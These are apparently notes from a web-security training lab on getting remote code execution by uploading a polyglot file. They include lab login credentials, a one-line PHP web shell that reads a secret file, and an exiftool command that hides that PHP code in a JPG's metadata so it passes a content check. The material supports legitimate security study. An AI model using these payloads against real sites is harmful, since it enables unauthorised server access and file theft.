# Lab 06 - Remote code execution via polyglot web shell upload

## System checks the contents of the file 

### End goal: Upload a basic PHP shell and get /home/carlos/secret

#### Credentials - wiener:peter

1. Login and try to uplaod basic php-shell
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Create a polyglot PHP/JPG with PHP payload in its metadata

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php